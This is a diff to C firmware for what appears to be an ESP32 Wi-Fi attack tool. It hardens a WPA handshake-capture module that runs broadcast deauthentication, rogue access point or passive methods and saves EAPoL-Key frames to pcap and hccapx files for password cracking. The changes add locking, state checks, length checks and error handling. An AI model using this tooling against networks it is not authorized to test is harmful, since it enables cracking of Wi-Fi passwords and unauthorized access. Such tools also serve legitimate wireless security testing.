@@ -26,6 +26,7 @@
 static const char *TAG = "main:attack_handshake";
 static attack_handshake_methods_t method = -1;
 static const wifi_ap_record_t *ap_record = NULL;
+static bool active;
 
 /**
  * @brief Callback for DATA_FRAME_EVENT_EAPOLKEY_FRAME event.
@@ -41,30 +42,44 @@ static const wifi_ap_record_t *ap_record = NULL;
 static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
     ESP_LOGI(TAG, "Got EAPoL-Key frame");
     ESP_LOGD(TAG, "Processing handshake frame...");
-    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
+    sniffer_frame_t *event = event_data;
+    if (!active || event->generation != wifictl_sniffer_generation()) return;
+    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *)event->packet;
+    if (frame->rx_ctrl.sig_len < 4) return;
+    attack_lock();
     attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
     pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
-    hccapx_serializer_add_frame((data_frame_t *) frame->payload);
+    hccapx_serializer_add_frame((data_frame_t *)frame->payload, frame->rx_ctrl.sig_len - 4);
+    attack_unlock();
 }
 
 void attack_handshake_start(attack_config_t *attack_config){
     ESP_LOGI(TAG, "Starting handshake attack...");
     method = attack_config->method;
     ap_record = attack_config->ap_record;
-    pcap_serializer_init();
-    hccapx_serializer_init(ap_record->ssid, strlen((char *)ap_record->ssid));
-    wifictl_sniffer_filter_frame_types(true, false, false);
-    wifictl_sniffer_start(ap_record->primary);
-    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
+    attack_lock();
+    if (!pcap_serializer_init()) {
+        attack_unlock();
+        attack_update_status(TIMEOUT);
+        return;
+    }
+    const attack_job_t *job = attack_get_job();
+    hccapx_serializer_init(job->ssid, job->ssid_len);
+    attack_unlock();
+    active = true;
     ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
+    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
+    esp_err_t err = wifictl_sniffer_filter_frame_types(true, false, false);
+    if (err == ESP_OK) err = wifictl_sniffer_start(ap_record->primary);
+    if (err != ESP_OK) goto failed;
     switch(attack_config->method){
         case ATTACK_HANDSHAKE_METHOD_BROADCAST:
             ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
-            attack_method_broadcast(ap_record, 5);
+            err = attack_method_broadcast(ap_record, 5);
             break;
         case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
             ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_ROGUE_AP");
-            attack_method_rogueap(ap_record);
+            err = attack_method_rogueap(ap_record);
             break;
         case ATTACK_HANDSHAKE_METHOD_PASSIVE:
             ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_PASSIVE");
@@ -73,9 +88,16 @@ void attack_handshake_start(attack_config_t *attack_config){
         default:
             ESP_LOGD(TAG, "Method unknown! Fallback to ATTACK_HANDSHAKE_METHOD_PASSIVE");
     }
+    if (err == ESP_OK) return;
+failed:
+    ESP_LOGE(TAG, "Capture start failed: %s", esp_err_to_name(err));
+    attack_handshake_stop();
+    attack_update_status(TIMEOUT);
 }
 
 void attack_handshake_stop(){
+    if (!active) return;
+    active = false;
     switch(method){
         case ATTACK_HANDSHAKE_METHOD_BROADCAST:
             attack_method_broadcast_stop();
@@ -92,7 +114,7 @@ void attack_handshake_stop(){
     }
     wifictl_sniffer_stop();
     frame_analyzer_capture_stop();
-    ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &eapolkey_frame_handler));
+    esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler);
     ap_record = NULL;
     method = -1;
     ESP_LOGD(TAG, "Handshake attack stopped");
